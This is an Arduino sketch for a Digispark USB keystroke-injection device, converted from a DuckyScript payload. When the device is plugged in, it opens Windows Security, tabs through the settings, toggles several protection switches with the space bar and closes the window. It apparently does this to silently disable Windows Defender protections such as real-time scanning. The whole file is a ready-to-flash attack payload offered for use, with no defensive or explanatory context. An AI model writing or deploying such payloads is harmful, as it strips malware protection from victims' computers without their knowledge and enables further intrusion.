#include "DigiKeyboard.h"

// windows security
const uint8_t key_arr_0[] PROGMEM = {0,26, 0,12, 0,17, 0,7, 0,18, 0,26, 0,22, 0,44, 0,22, 0,8, 0,6, 0,24, 0,21, 0,12, 0,23, 0,28};

void duckyString(const uint8_t* keys, size_t len) {  
    for(size_t i=0; i<len; i+=2) {
        DigiKeyboard.sendKeyStroke(pgm_read_byte_near(keys + i+1), pgm_read_byte_near(keys + i));
    }
}

void setup() {
    pinMode(1, OUTPUT); // Enable LED
    digitalWrite(1, LOW); // Turn LED off
    DigiKeyboard.sendKeyStroke(0); // Tell computer no key is pressed

    DigiKeyboard.delay(500); // DELAY 200
    DigiKeyboard.sendKeyStroke(41, 1); // CTRL ESC
    DigiKeyboard.delay(400); // DELAY 400
    duckyString(key_arr_0, sizeof(key_arr_0)); // STRING windows security
    DigiKeyboard.delay(2000); // DELAY 500
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(1000); // DELAY 400
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(40, 0); // ENTER
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(44, 0); // SPACE
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(44, 0); // SPACE
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(43, 0); // TAB
    DigiKeyboard.delay(200); // DELAY 200
    DigiKeyboard.sendKeyStroke(44, 0); // SPACE
    DigiKeyboard.delay(500); // DELAY 500
    DigiKeyboard.sendKeyStroke(61, 4); // ALT F4
}

void loop() {}